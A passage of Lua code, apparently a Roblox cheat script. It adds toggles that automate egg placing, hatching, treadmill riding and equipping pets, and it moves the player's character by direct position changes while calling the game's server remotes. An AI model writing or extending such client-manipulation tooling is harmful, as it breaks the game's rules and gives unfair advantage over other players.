				if not v29 or type(tbl3.StealHome) ~= "function" then
					return nil
				end
				local v30 = fn22()
				if v29.Position.X < v30 == arg.X < v30 then
					return nil
				end
				local ok, result = pcall(tbl3.StealHome)
				if not ok or typeof(result) ~= "Vector3" then
					return nil
				end

				if (result - arg).Magnitude <= 12 or (v29.Position - result).Magnitude <= 12 then
					return nil
				end
				return result
			end

			fn23 = function(arg, arg2, arg3, arg4)
				local v29 = tbl3.Root()
				if not v29 then
					return false
				end

				if not arg4 then
					local v30 = fn24(arg)
					if v30 and not fn23(v30, arg2, arg3, true) then
						return false
					end

					if arg2 and arg2() then
						return false
					end
					v29 = tbl3.Root()
					if not v29 then
						return false
					end
				end

				tbl3.Shield(arg3 or "place", true)
				tbl3.Driving = tbl3.Driving + 1
				task.wait(0.2)
				local n23 = arg + Vector3.new(0, 3, 0)
				local n24 = math.max(v29.Position.Y, n23.Y) + n20

				local ok, result = pcall(function()
					return fn21(Vector3.new(v29.Position.X, n24, v29.Position.Z), arg2) and fn21(Vector3.new(n23.X, n24, n23.Z), arg2) and fn21(n23, arg2)
				end)

				ok = ok and result == true
				tbl3.Driving = math.max(0, tbl3.Driving - 1)
				tbl3.Shield(arg3 or "place", false)
				return ok
			end

			tbl3.FlyTo = function(arg, arg2, arg3)
				return fn23(arg, arg2, arg3 or "fly")
			end

			local function fn25()
				local eggState = tbl.EggState
				if type(eggState) ~= "table" or type(eggState.PlantEgg) ~= "function" then
					return false
				end
				local v29 = fn15()
				if not fn16(#v29) then
					return false
				end
				fn20()
				local v30, v31, v32 = fn17()
				local n23 = n13 - (tonumber(v32) or 0)
				if n23 <= 0 then
					return false
				end
				local v33 = tbl3.PenAnchor()
				if not v33 then
					return false
				end
				tbl3.Movement.PlaceWanted = true
				if not tbl3.ClaimMovement("place") then
					return "waiting"
				end
				local v34 = n19

				local function fn26()
					if v34 ~= n19 or not tbl3.Toggle(v23, false) then
						return true
					end

					if tbl3.IsNight() then
						return false
					end
					return v22 == tbl23[4] or tbl3.Movement.StealFirst
				end

				if tbl3.Treadmill.Riding or tbl3.OnBelt() then
					tbl3.ExitBelt()
				end

				local function fn27()
					tbl3.HoldBelt()
					local ok, result = pcall(fn23, v33, fn26)
					tbl3.ReleaseBelt()
					return ok and result and true or false
				end

				if n9 < tbl3.DistanceTo(v33) then
					str3 = "Flying to the pen"

					if not fn27() then
						tbl3.LeaveBelt()
						n12 = os.clock() + n10
						return false
					end
				end

				tbl3.LeaveBelt()
				if fn26() then
					return false
				end

				local function fn28()
					if tbl3.DistanceTo(v33) <= n9 then
						return true
					end

					if fn26() then
						return false
					end
					str3 = "Pen out of reach, flying back"
					return fn27() and tbl3.DistanceTo(v33) <= n9
				end

				if not fn28() then
					str3 = "Could not reach the pen, trying again soon"
					n12 = os.clock() + n10
					return false
				end

				local v35 = fn18()
				local n24 = 0
				local n25 = 0

				for _, v36 in ipairs(v29) do
					if not (n24 >= n23 or fn26()) then
						if not fn28() then
							str3 = "Pen out of reach, stopping this pass"
							break
						else
							local ok, result = pcall(eggState.WearEggTool, v36.Uid)

							if ok and result ~= false then
								task.wait(0.15)
								local n26 = 0
								local flag4 = false

								for _, v37 in ipairs(fn19(v35)) do
									if not (fn26() or n26 >= n11) then
										n26 += 1
										local AskPlaceEgg, v38 = fn10("RF/EggWorld/AskPlaceEgg", { Uid = v36.Uid, LocalCFrame = v37 })

										if AskPlaceEgg and v38 ~= false then
											table.insert(v35, Vector2.new(v37.Position.X, v37.Position.Z))
											n24 += 1
											flag4 = true
											break
										else
											continue
										end
									end

									break
								end

								if flag4 then
									n25 = 0
									continue
								else
									tbl26[v36.Uid] = true
									n25 += 1
									if not (n25 >= 2) then
										continue
									end
								end
							else
								tbl26[v36.Uid] = true
								continue
							end
						end
					end

					break
				end

				if type(eggState.DoffEggTool) == "function" then
					pcall(eggState.DoffEggTool)
				end

				if n24 == 0 then
					n12 = os.clock() + n10
				end

				return n24 > 0
			end

			tbl2.Add(function()
				local v29, v30 = fn20()

				if v24 and type(v24.Set) == "function" then
					pcall(v24.Set, v24, str3)
				end

				local num = tonumber(v30)
				local flag4 = num ~= nil and v27 ~= nil and num < v27

				if num then
					v27 = num
				end

				if flag4 then
					table.clear(tbl26)
				end

				if not tbl3.Toggle(v23, false) then
					tbl3.Movement.PlaceWanted = false
					tbl3.ReleaseMovement("place")
					return false
				end

				if flag3 then
					return false
				end

				if os.clock() < n12 then
					tbl3.Movement.PlaceWanted = false
					return false
				end

				if tbl3.Movement.StealFirst and not tbl3.IsNight() then
					tbl3.Movement.PlaceWanted = false
					return false
				end
				flag3 = true

				task.spawn(function()
					local ok, result = pcall(fn25)

					if not (ok and result == "waiting") then
						tbl3.Movement.PlaceWanted = false
					end

					tbl3.ReleaseMovement("place")
					flag3 = false
					tbl2.Wake()
				end)

				return false
			end)

			v23 = v17:CreateToggle({
				Name = "Auto Place Egg",
				Default = false,
				Callback = function()
					table.clear(tbl26)
					n19 += 1
					tbl3.StopWalking()
					tbl2.Wake()
				end,
			})

			v24 = v17:CreateText({ Name = "Pen Status", Text = str3 })

			tbl3.Rift.Restart.Place = function()
				table.clear(tbl26)
				tbl2.Wake()
			end
		end

		local save = tbl.Save

		if type(save) == "table" and type(save.FieldSignal) == "function" then
			for _, v25 in ipairs({ "EggInventory", "EquippedAssets", "BaseUpgradeLevel" }) do
				local ok, result = pcall(save.FieldSignal, v25)

				if ok and type(result) == "table" and type(result.Connect) == "function" then
					local ok2, result2 = pcall(result.Connect, result, function()
						tbl2.Wake()
					end)

					if ok2 and result2 then
						fn4(function()
							pcall(function()
								result2:Disconnect()
							end)
						end)
					end
				end
			end
		end

		do
			local eggState = tbl.EggState
			local carryChanged = type(eggState) == "table" and eggState.CarryChanged or nil

			if type(carryChanged) == "table" and type(carryChanged.Connect) == "function" then
				local ok, result = pcall(carryChanged.Connect, carryChanged, function(arg)
					local carrying = type(arg) == "table" and arg.IsCarrying == true

					if tbl3.Steal.Carrying and not carrying then
						tbl3.Steal.LastFinishedAt = os.clock()
					end

					if carrying and type(arg.Uid) == "string" then
						tbl3.Steal.CarryUid = arg.Uid
						tbl3.Steal.CarryAreaId = arg.AreaId
					end

					tbl3.Steal.Carrying = carrying
					tbl2.Wake()
				end)

				if ok and result then
					fn4(function()
						pcall(function()
							result:Disconnect()
						end)
					end)
				end
			end
		end

		do
			local n14 = 10
			local n15 = 1
			local n16 = 5

			local function fn9(arg)
				local v25 = networking:FindFirstChild(arg)
				if not v25 or not v25:IsA("RemoteFunction") then
					return false, nil, nil
				end
				local ok, result, result2 = pcall(v25.InvokeServer, v25)
				return ok, result, result2
			end

			local n17 = 0
			local flag3 = false

			local function fn10(arg, arg2, arg3)
				if arg and arg2 ~= false then
					n17 = 0
					flag3 = false
					return true
				end

				if arg and tostring(arg3) == "Already using treadmill" then
					n17 = 0
					flag3 = false
					return true
				end

				if arg and tostring(arg3) == "Not grounded" and tbl3.Grounded() then
					n17 += 1

					if n17 >= 2 then
						n17 = 0

						if not flag3 then
							flag3 = true
							pcall(tbl3.UndoSwap)
						elseif type(tbl3.RequestRespawn) == "function" then
							flag3 = false
							tbl3.RequestRespawn()
						end
					end
				end

				return false
			end

			local v25 = nil
			local v26 = nil
			local flag4 = false
			local n18 = 0
			local flag5 = false
			local treadmill = tbl3.Treadmill

			local function fn11()
				return tbl3.Toggle(v25, false)
			end

			local function fn12()
				local movement = tbl3.Movement
				return movement.PlaceWanted or movement.ScrambleWanted or movement.MutationWanted or movement.FracturedWanted or movement.Owner ~= nil and movement.Owner ~= "treadmill" or tbl3.Steal.Active or tbl3.Steal.Carrying
			end

			local function fn13()
				local v27 = n18
				if fn12() or not tbl3.ClaimMovement("treadmill") then
					return false
				end

				local function fn14()
					return v27 ~= n18 or not fn11() or tbl3.Movement.Owner ~= "treadmill" or fn12()
				end

				if tbl3.BeltHeld() then
					tbl3.ResetBelt()
				end

				local v28 = tbl3.Belt()
				if not v28 then
					return false
				end
				local n19 = v28.Position + Vector3.new(0, v28.Size.Y / 2, 0)

				if tbl3.DistanceTo(n19 + Vector3.new(0, 2, 0)) > n14 then
					if type(tbl3.FlyTo) ~= "function" or not tbl3.FlyTo(n19, fn14, "treadmill") then
						return false
					end
				end

				if fn14() then
					return false
				end
				treadmill.Riding = fn10(fn9("RF/Treadmill/AskWearStill"))
				return treadmill.Riding
			end

			tbl2.Add(function()
				if not fn11() then
					if treadmill.Riding and not flag4 then
						flag4 = true

						task.spawn(function()
							pcall(tbl3.ExitBelt)
							flag4 = false
							tbl2.Wake()
						end)
					end

					return false
				end

				if flag4 or fn12() then
					return false
				end

				if treadmill.Riding and tbl3.Toggle(v26, true) and tbl3.OnBelt() then
					if os.clock() >= (treadmill.NextCheck or 0) and not tbl3.Flying and tbl3.Grounded() then
						treadmill.NextCheck = os.clock() + n16
						flag4 = true

						task.spawn(function()
							local ok, result = pcall(function()
								return fn10(fn9("RF/Treadmill/AskWearStill"))
							end)

							treadmill.Riding = ok and result == true

							if not treadmill.Riding then
								treadmill.NextTry = 0
							end

							flag4 = false
							tbl2.Wake()
						end)
					end

					return false
				end

				if os.clock() < (treadmill.NextTry or 0) then
					return false
				end
				treadmill.NextCheck = 0
				treadmill.NextTry = os.clock() + (treadmill.LastFailed and 3 or 4)
				flag4 = true

				task.spawn(function()
					local ok, result = pcall(fn13)
					treadmill.LastFailed = not (ok and result == true)
					tbl3.ReleaseMovement("treadmill")
					flag4 = false
					tbl2.Wake()
				end)

				return false
			end)

			task.spawn(function()
				while not flag5 do
					task.wait(3)

					if not fn11() and not fn12() and not tbl3.Flying and tbl3.OnBelt() and tbl3.Grounded() then
						fn10(fn9("RF/Treadmill/AskWearStill"))
					end
				end
			end)

			task.spawn(function()
				local n19 = 0

				while not flag5 do
					local v27 = task.wait(0.25)

					if not fn11() or not treadmill.Riding or fn12() then
						n19 = 0
					elseif tbl3.OnBelt() then
						n19 = 0
					else
						n19 += v27

						if n19 >= 1.5 then
							treadmill.Riding = false
							treadmill.NextTry = 0
							tbl2.Wake()
							n19 = 0
						end
					end
				end
			end)

			task.spawn(function()
				local n19 = 0
				local n20 = 0
				local position = nil

				while not flag5 do
					local v27 = task.wait(0.25)
					n19 = math.max(0, n19 - v27)
					local flag6 = treadmill.Riding and fn11() and not fn12()
					local v28 = tbl3.Root()
					local character = localPlayer.Character
					character = character and character:FindFirstChildOfClass("Humanoid")

					if flag6 or not (tbl3.Flying or tbl3.Movement.Owner ~= nil or tbl3.Movement.PlaceWanted or character ~= nil and character.MoveDirection.Magnitude > 0.1) or not v28 or not tbl3.OnBelt() then
						position = v28 and v28.Position
						n20 = 0
						position = position or nil
					else
						local vector = Vector3.new(v28.Position.X, 0, v28.Position.Z)
						position = position and (vector - Vector3.new(position.X, 0, position.Z)).Magnitude < 0.5

						if position then
							n20 += v27
						else
							n20 = 0
						end

						position = v28.Position

						if n20 >= n15 and n19 <= 0 then
							pcall(tbl3.ExitBelt)
							n19 = 1.5
							n20 = 0
						end
					end
				end
			end)

			fn4(function()
				flag5 = true
				treadmill.Riding = false
			end)

			v25 = v18:CreateToggle({
				Name = "Auto Treadmill",
				Default = false,
				Callback = function()
					n18 += 1
					tbl3.StopWalking()
					tbl2.Wake()
				end,
			})

			v26 = v18:CreateToggle({ Name = "Stay On Treadmill", Default = true })
		end

		do
			local n14 = 4
			local n15 = 10
			local v25 = nil
			local flag3 = false
			local n16 = 0
			local tbl25 = {}
			local tbl26 = { MinRarity = 0, MinIncome = 0, Eggs = {} }

			local function fn9(arg, arg2)
				local v26 = networking:FindFirstChild(arg)
				if not v26 or not v26:IsA("RemoteFunction") then
					return false, nil
				end
				return pcall(v26.InvokeServer, v26, arg2)
			end

			local function fn10(arg)
				local flag4 = tbl26.MinRarity > 0

				if flag4 then
					local minRarity = tbl26.MinRarity
					flag4 = tbl3.EggRarity(arg) < minRarity
				end

				if flag4 then
					return false
				end
				local flag5 = tbl26.MinIncome > 0

				if flag5 then
					local minIncome = tbl26.MinIncome
					flag5 = tbl3.EggIncome(arg) < minIncome
				end

				if flag5 then
					return false
				end

				if next(tbl26.Eggs) ~= nil and tbl26.Eggs[tostring(arg.AssetCategory)] ~= true then
					return false
				end
				return true
			end

			local function fn11()
				local eggState = tbl.EggState
				if type(eggState) ~= "table" or type(eggState.ReadOwnerEggs) ~= "function" then
					return {}
				end
				local ok, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)
				if not ok or type(result) ~= "table" then
					return {}
				end
				local flag4 = tbl3.Toggle(v25, false) == true
				local Hatch = tbl3.RiftOn("Hatch") and tbl3.RiftShortfall() or {}
				local tbl27 = {}
				local tbl28 = {}

				for k, v26 in pairs(result) do
					local flag5 = type(v26) == "table" and v26.Placement ~= nil

					if flag5 then
						flag5 = (tbl25[k] or 0) <= os.clock()
					end

					if flag5 then
						local ok2, result2 = pcall(eggState.IsReadyToHatch, k)

						if ok2 and result2 == true then
							local str2 = tostring(v26.AssetCategory)

							if (Hatch[str2] or 0) > 0 then
								Hatch[str2] = Hatch[str2] - 1
								table.insert(tbl27, k)
							elseif flag4 and fn10(v26) then
								table.insert(tbl28, k)
							end
						end
					end
				end

				for _, v26 in ipairs(tbl28) do
					table.insert(tbl27, v26)
				end

				return tbl27
			end

			local function fn12()
				return tbl3.Toggle(v25, false) or tbl3.RiftOn("Hatch")
			end

			local function fn13()
				local v26 = n16
				local v27 = fn11()
				local n17 = 0

				for _, v28 in ipairs(v27) do
					if not (n17 >= n14 or v26 ~= n16 or not fn12()) then
						local AskHatch, v29 = fn9("RF/EggWorld/AskHatch", v28)

						if AskHatch and v29 ~= false then
							task.wait(0.35)
							fn9("RF/EggWorld/AskFinishHatch", v28)
							n17 += 1
							tbl25[v28] = nil
						else
							tbl25[v28] = os.clock() + n15
						end

						task.wait(0.2)
						continue
					end

					break
				end

				return n17 > 0
			end

			tbl2.Add(function()
				if not fn12() or flag3 then
					return false
				end
				flag3 = true

				task.spawn(function()
					pcall(fn13)
					flag3 = false
				end)

				return false
			end)

			local function hatch()
				n16 += 1
				table.clear(tbl25)
				tbl2.Wake()
			end

			v25 = v19:CreateToggle({ Name = "Auto Hatch", Default = false, Callback = hatch })

			v19:CreateDropdown({
				Name = "Hatch Min Rarity",
				Note = "Hatch eggs of the chosen rarity and every rarity above it",
				Options = tbl11,
				Default = tbl11[1],
				SubOf = v25,
				Callback = function(arg)
					tbl26.MinRarity = tbl12[arg] or 0
					hatch()
				end,
			})

			local tbl27 = {
				["K/s"] = { Min = 0, Max = 1000, Mult = 1000 },
				["M/s"] = { Min = 0, Max = 1000, Mult = 1000000 },
				["B/s"] = { Min = 0, Max = 100, Mult = 1e9 },
			}

			local tbl28 = { Slider = nil, Value = 0, Unit = "M/s" }

			local function fn14(arg, arg2)
				if arg ~= nil then
					tbl28.Value = math.max(0, math.floor(tonumber(arg) or tbl28.Value))
				end

				if arg2 ~= nil then
					tbl28.Unit = tostring(arg2)
				end

				tbl26.MinIncome = tbl28.Value * (tbl27[tbl28.Unit] or tbl27["M/s"]).Mult
				hatch()
			end

			tbl28.Slider = v19:CreateSlider({
				Name = "Hatch Min Value",
				Note = "Skip eggs worth less than this (0 = off)",
				Min = 0,
				Max = 1000,
				Default = 0,
				AllowDecimals = false,
				Increment = 1,
				SubOf = v25,
				Unit = {
					Default = "M/s",
					Selector = true,
					Options = { "K/s", "M/s", "B/s" },
					ColorEnabled = true,
					Colors = { Number = Color3.fromRGB(255, 255, 255), Suffix = Color3.fromRGB(58, 255, 55) },
					Callback = function(arg)
						local ms = tbl27[arg] or tbl27["M/s"]
						local slider = tbl28.Slider

						if slider and slider.SetRange then
							slider:SetRange(ms.Min, ms.Max)
							local min = tonumber(slider:Get()) or ms.Min
							local min2 = ms.Min
							local max = ms.Max
							local n17 = math.clamp(math.floor(min + 0.5), min2, max)

							if n17 ~= min then
								tbl28.Unit = tostring(arg)
								slider:Set(n17)
								return
							end

							fn14(n17, arg)
						else
							fn14(nil, arg)
						end
					end,
				},
				Callback = function(arg)
					fn14(arg, nil)
				end,
			})

			local tbl29 = {}
			local tbl30 = {}
			local directory = tbl.Assets and tbl.Assets.Directory
			local n17 = 0

			while (type(directory) ~= "table" or next(directory) == nil) and n17 < 2 do
				n17 += task.wait(0.1)

				if type(tbl.Assets) ~= "table" then
					tbl.Assets = fn2(function()
						return ReplicatedStorage.Data.Assets
					end)
				end

				directory = tbl.Assets and tbl.Assets.Directory
			end

			local tbl31 = {}

			if type(directory) == "table" then
				for k, v26 in pairs(directory) do
					local rarity = type(v26) == "table" and v26.Rarity or nil
					local flag4 = type(rarity) == "table"

					if flag4 then
						flag4 = tonumber(rarity.RarityNumber or rarity.Rank)
					end

					flag4 = flag4 or nil

					if flag4 then
						table.insert(tbl31, {
							Category = tostring(k),
							Name = tostring(v26.DisplayName or k),
							Rarity = flag4,
							RarityName = tostring(rarity.DisplayName or rarity._id or flag4),
						})
					end
				end
			end

			table.sort(tbl31, function(arg, arg2)
				if arg.Rarity ~= arg2.Rarity then
					return arg.Rarity > arg2.Rarity
				end
				return arg.Name < arg2.Name
			end)

			for _, v26 in ipairs(tbl31) do
				local str2 = string.format("%s [%s]", v26.Name, v26.RarityName)

				if tbl30[str2] then
					str2 = string.format("%s [%s] (%s)", v26.Name, v26.RarityName, v26.Category)
				end

				table.insert(tbl29, str2)
				tbl30[str2] = v26.Category
			end

			if #tbl29 > 0 then
				fn5(v19:CreateMultiDropdown({
					Name = "Hatch Specific Eggs",
					Note = "Only hatch these eggs (empty = all)",
					Options = tbl29,
					Default = {},
					SubOf = v25,
					Callback = function(arg)
						local eggs = {}

						if type(arg) == "table" then
							for k, v26 in pairs(arg) do
								k = v26 == true and type(k) == "string" and k or type(v26) == "string" and v26 or nil

								if k and tbl30[k] then
									eggs[tbl30[k]] = true
								end
							end
						end

						tbl26.Eggs = eggs
						hatch()
					end,
				}))
			end

			tbl3.Rift.Restart.Hatch = hatch
		end

		do
			local n14 = 5
			local n15 = 30
			local v25 = nil
			local flag3 = false
			local n16 = 0
			local tbl25 = {}
			local n17 = 0
			local flag4 = true
			local v26 = nil
			local n18 = -math.huge

			local function fn9(arg)
				local v27 = fn2(function()
					return ReplicatedStorage.Data.Bases
				end)

				if type(v27) == "table" and type(v27.GetAssetEquipCapacity) == "function" then
					local ok, result = pcall(v27.GetAssetEquipCapacity, arg and tonumber(arg.BaseUpgradeLevel) or 0)
					if ok and tonumber(result) then
						return math.floor(tonumber(result))
					end
				end

				if v26 and os.clock() - n18 < n15 then
					return v26
				end
				local rfPenRosterAskWearLimit = networking:FindFirstChild("RF/PenRoster/AskWearLimit")

				if rfPenRosterAskWearLimit and rfPenRosterAskWearLimit:IsA("RemoteFunction") then
					local ok, result = pcall(rfPenRosterAskWearLimit.InvokeServer, rfPenRosterAskWearLimit)

					if ok and tonumber(result) then
						local n19 = math.floor(tonumber(result))
						local now = os.clock()
						v26 = n19
						n18 = now
						return v26
					end
				end

				local v28 = v26
				local n19

				if v26 then
					n19 = v28
				else
					n19 = 0
				end

				return n19
			end

			local function fn10(arg)
				local directory = tbl.Assets and tbl.Assets.Directory
				local flag5 = type(directory) == "table" and directory[tostring(arg.Category)] or nil
				local n19 = type(flag5) == "table" and tonumber(flag5.EarningRate) or 0
				local n20 = tonumber(arg.Scale) or 0
				if n19 <= 0 or n20 <= 0 then
					return 0
				end
				local n21 = n20 > 5 and (n20 / 5) ^ 1.2 * 19.637875755794113 or n20 ^ 1.85
				local mutations = tbl.Mutations
				local flag6 = type(mutations) == "table" and type(mutations.EarningsFor) == "function"
				local n22 = 1

				if flag6 then
					local ok
					ok, n22 = pcall(mutations.EarningsFor, type(arg.Mutations) == "table" and arg.Mutations or {})
					ok = ok and type(n22) == "number"
					local n23 = 1

					if not ok then
						n22 = n23
					end
				end

				return n19 * n21 * n22
			end

			local function fn11()
				local save2 = tbl.Save
				local flag5 = type(save2) == "table" and type(save2.Get) == "function"
				local result = nil

				if flag5 then
					local ok
					ok, result = pcall(save2.Get)
					result = ok and type(result) == "table" and result or nil
				end

				if not result then
					return nil
				end
				local tbl26 = {}
				local tbl27 = {}
				local v27 = pairs
				local equippedAssets = result.EquippedAssets or {}

				for _, equippedAsset in v27(equippedAssets) do
					if type(equippedAsset) == "string" then
						tbl26[equippedAsset] = true
						table.insert(tbl27, equippedAsset)
					end
				end

				local tbl28 = {}
				local v28 = pairs
				local inventory = result.Inventory or {}

				for k, v29 in v28(inventory) do
					if type(v29) == "table" and v29.InFuse ~= true then
						table.insert(tbl28, { Uid = k, Income = fn10(v29), Equipped = tbl26[k] == true })
					end
				end

				table.sort(tbl28, function(arg, arg2)
					if arg.Income ~= arg2.Income then
						return arg.Income > arg2.Income
					end
					return tostring(arg.Uid) < tostring(arg2.Uid)
				end)

				return tbl28, tbl26, #tbl27, result
			end

			local function fn12(arg, arg2)
				local tbl26 = {}
				local flag5 = false

				for i, v27 in ipairs(arg) do
					if not (arg2 < i) then
						if not v27.Equipped then
							table.insert(tbl26, v27.Uid)

							if not tbl25[v27.Uid] then
								flag5 = true
							end
						end

						continue
					end

					break
				end

				return tbl26, flag5
			end

			tbl2.Add(function()
				if not tbl3.Toggle(v25, false) then
					return false
				end
				local v27, v28, v29, v30 = fn11()

				if v27 then
					local v31 = fn9(v30)
					local v32, v33 = fn12(v27, v31)

					if (v33 or flag4) and not flag3 and os.clock() >= n17 then
						for _, v34 in ipairs(v32) do
							tbl25[v34] = true
						end

						flag4 = false
						flag3 = true
						n17 = os.clock() + n14
						local v34 = n16

						task.spawn(function()
							local rfHaulFetchWearBestStatus = networking:FindFirstChild("RF/Haul/FetchWearBestStatus")
							local isRemoteFunction = rfHaulFetchWearBestStatus and rfHaulFetchWearBestStatus:IsA("RemoteFunction")
							local flag5 = true

							if isRemoteFunction then
								local result
								flag5, result = pcall(rfHaulFetchWearBestStatus.InvokeServer, rfHaulFetchWearBestStatus)
								flag5 = flag5 and result ~= false and result ~= nil
							end

							local rfHaulWearBest = networking:FindFirstChild("RF/Haul/WearBest")

							if flag5 and v34 == n16 and rfHaulWearBest and rfHaulWearBest:IsA("RemoteFunction") then
								pcall(rfHaulWearBest.InvokeServer, rfHaulWearBest)
							end

							flag3 = false
							tbl2.Wake()
						end)
					end
				end

				return false
			end)

			v25 = v19:CreateToggle({
				Name = "Auto Equip Best",
				Note = "Equip Best when a better pet appears",
				Default = false,
				Callback = function()
					n16 += 1
					table.clear(tbl25)
					n17 = 0
					flag4 = true
					tbl2.Wake()
				end,
			})

			local save2 = tbl.Save

			if type(save2) == "table" and type(save2.FieldSignal) == "function" then
				for _, v27 in ipairs({ "Inventory", "EquippedAssets" }) do
					local ok, result = pcall(save2.FieldSignal, v27)

					if ok and type(result) == "table" and type(result.Connect) == "function" then
						local ok2, result2 = pcall(result.Connect, result, function()
							flag4 = true
							tbl2.Wake()
						end)

						if ok2 and result2 then
							fn4(function()
								pcall(function()
									result2:Disconnect()
								end)
							end)
						end
					end
				end
			end
		end

		local n14
		n14 = 3
		local n15
		n15 = 50
		local tbl25
		tbl25 = { "Rarity Only", "Value Only", "Rarity And Value", "Rarity Or Value" }
		local v25

		v25 = fn2(function()
			return ReplicatedStorage.Shared.Util.AssetItems
		end)

		local tbl26
		tbl26 = {}
		local tbl27
		tbl27 = {}
		local tbl28
		tbl28 = {}
		local tbl29
		tbl29 = {}

		do
			local directory = tbl.Assets and tbl.Assets.Directory
			local tbl30 = {}
			local tbl31 = {}

			if type(directory) == "table" then
				for k, v26 in pairs(directory) do
					local rarity = type(v26) == "table" and v26.Rarity or nil
					local flag3 = type(rarity) == "table"

					if flag3 then
						flag3 = tonumber(rarity.RarityNumber or rarity.Rank)
					end

					flag3 = flag3 or nil

					if flag3 then
						local str2 = tostring(rarity.DisplayName or rarity._id or flag3)
						tbl30[flag3] = tbl30[flag3] or str2

						table.insert(tbl31, {
							Category = tostring(k),
							Name = tostring(v26.DisplayName or k),
							Rarity = flag3,
							RarityName = str2,
						})
					end
				end
			end

			local tbl32 = {}

			for k in pairs(tbl30) do
				table.insert(tbl32, k)
			end

			table.sort(tbl32)

			for _, v26 in ipairs(tbl32) do
				local str2 = string.format("%d - %s", v26, tbl30[v26])
				table.insert(tbl26, str2)
				tbl27[str2] = v26
			end

			table.sort(tbl31, function(arg, arg2)
				if arg.Rarity ~= arg2.Rarity then
					return arg.Rarity < arg2.Rarity
				end
				return arg.Name < arg2.Name
			end)

			for _, v26 in ipairs(tbl31) do
				local str2 = string.format("%s [%s]", v26.Name, v26.RarityName)

				if tbl29[str2] then
					str2 = string.format("%s [%s] (%s)", v26.Name, v26.RarityName, v26.Category)
				end

				table.insert(tbl28, str2)
				tbl29[str2] = v26.Category
			end
		end

		local fn9

		fn9 = function(arg)
			for _, v26 in ipairs(tbl26) do
				if tbl27[v26] == arg then
					return v26
				end
			end

			return tbl26[1]
		end

		local v26
		v26 = nil
		local v27
		v27 = nil
		local v28

		do
			local v29 = nil
			v28 = nil
			local v30 = tbl25[1]
			local n16 = 3
			local n17 = 0
			local flag3 = true
			local tbl30 = {}
			local v31 = tbl25[1]
			local n18 = 3
			local n19 = 0
			local flag4 = true
			local tbl31 = {}
			local flag5 = false
			local n20 = 0

			local function fn10(arg)
				local n21 = tonumber(arg) or 0
				local tbl32 = { "", "K", "M", "B", "T", "Qa", "Qi" }
				local n22 = 1

				while math.abs(n21) >= 1000 and n22 < #tbl32 do
					n21 /= 1000
					n22 += 1
				end

				return string.format(n22 == 1 and "$%.0f%s" or "$%.2f%s", n21, tbl32[n22])
			end

			local function fn11(arg, arg2)
				local tbl32 = {}

				if type(arg) == "table" then
					for k, v32 in pairs(arg) do
						k = v32 == true and type(k) == "string" and k

						if k then
							v32 = k
						else
							v32 = type(v32) == "string" and v32
						end

						v32 = v32 or nil

						if v32 then
							tbl32[arg2 and arg2[v32] or v32] = true
						end
					end
				end

				return tbl32
			end

			local function fn12(arg)
				local directory = tbl.Assets and tbl.Assets.Directory
				local flag6 = type(directory) == "table" and directory[tostring(arg)] or nil
				local rarity = type(flag6) == "table" and flag6.Rarity or nil
				local flag7 = type(rarity) == "table"

				if flag7 then
					flag7 = tonumber(rarity.RarityNumber or rarity.Rank)
				end

				return flag7 or math.huge
			end

			local function fn13(arg)
				local directory = tbl.Assets and tbl.Assets.Directory
				local flag6 = type(directory) == "table" and directory[tostring(arg.Category)] or nil
				local n21 = type(flag6) == "table" and tonumber(flag6.EarningRate) or 0
				local n22 = tonumber(arg.Scale) or 0
				if n21 <= 0 or n22 <= 0 then
					return 0
				end
				local n23 = n22 > 5 and (n22 / 5) ^ 1.2 * 19.637875755794113 or n22 ^ 1.85
				local mutations = tbl.Mutations
				local flag7 = type(mutations) == "table" and type(mutations.EarningsFor) == "function"
				local n24 = 1

				if flag7 then
					local ok
					ok, n24 = pcall(mutations.EarningsFor, type(arg.Mutations) == "table" and arg.Mutations or {})
					ok = ok and type(n24) == "number"
					local n25 = 1

					if not ok then
						n24 = n25
					end
				end

				return n21 * n23 * n24
			end

			local function fn14(arg)
				return type(arg) == "table" and next(arg) ~= nil
			end

			local function fn15()
				local save2 = tbl.Save
				if type(save2) ~= "table" or type(save2.Get) ~= "function" then
					return nil
				end
				local ok, result = pcall(save2.Get)
				return ok and type(result) == "table" and result or nil
			end

			local function fn16()
				local v32 = fn15()
				local tbl32 = {}
				if not v32 then
					return tbl32, 0
				end
				local tbl33 = {}
				local v33 = pairs
				local equippedAssets = v32.EquippedAssets or {}

				for _, equippedAsset in v33(equippedAssets) do
					tbl33[equippedAsset] = true
				end

				local v34 = pairs
				local inventory = v32.Inventory or {}
				local n21 = 0

				for k, v35 in v34(inventory) do
					local flag6 = type(v35) == "table" and v35.InFuse ~= true and v35.IsFavorite ~= true and not tbl33[k] and not tbl30[tostring(v35.Category)]

					if flag6 then
						flag6 = not (flag3 and fn14(v35.Mutations))
					end

					if flag6 then
						local v36 = fn13(v35)
						local flag7 = fn12(v35.Category) <= n16
						local flag8 = n17 > 0 and v36 < n17

						if v30 == tbl25[2] then
							flag7 = flag8
						elseif v30 == tbl25[3] then
							flag7 = flag7 and flag8
						elseif v30 == tbl25[4] then
							flag7 = flag7 or flag8
						end

						if flag7 then
							table.insert(tbl32, k)
							local flag9 = type(v25) == "table" and type(v25.SalePrice) == "function"
							local flag10 = false
							local result = nil

							if flag9 then
								flag10, result = pcall(v25.SalePrice, v35)
							end

							n21 += flag10 and tonumber(result) or v36 * 100
						end
					end
				end

				return tbl32, n21
			end

			local function fn17()
				local tbl32 = {}
				local eggState = tbl.EggState
				if type(eggState) ~= "table" or type(eggState.ReadOwnerEggs) ~= "function" then
					return tbl32, 0
				end
				local ok, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)
				if not ok or type(result) ~= "table" then
					return tbl32, 0
				end
				local character = localPlayer.Character
				character = character and character:FindFirstChildWhichIsA("Tool")
				character = character and character:GetAttribute("UID") or nil
				local eggRecords = tbl.EggRecords
				local v32, v33, v34 = pairs(result)
				local n21 = 0

				for k, v35 in v32, v33, v34 do
					local flag6 = type(v35) == "table" and v35.Placement == nil and k ~= character and not tbl31[tostring(v35.AssetCategory)]

					if flag6 then
						flag6 = not (flag4 and fn14(v35.Mutations))
					end

					if flag6 then
						local v36 = fn13({ Category = v35.AssetCategory, Scale = v35.AssetScale, Mutations = v35.Mutations })
						local flag7 = fn12(v35.AssetCategory) <= n18
						local flag8 = n19 > 0 and v36 < n19
						local v37

						if v31 == tbl25[2] then
							v37 = flag8
						elseif v31 == tbl25[3] then
							v37 = flag7 and flag8
						elseif v31 ~= tbl25[4] then
							v37 = flag7
						else
							v37 = flag7 or flag8
						end

						if v37 then
							table.insert(tbl32, k)

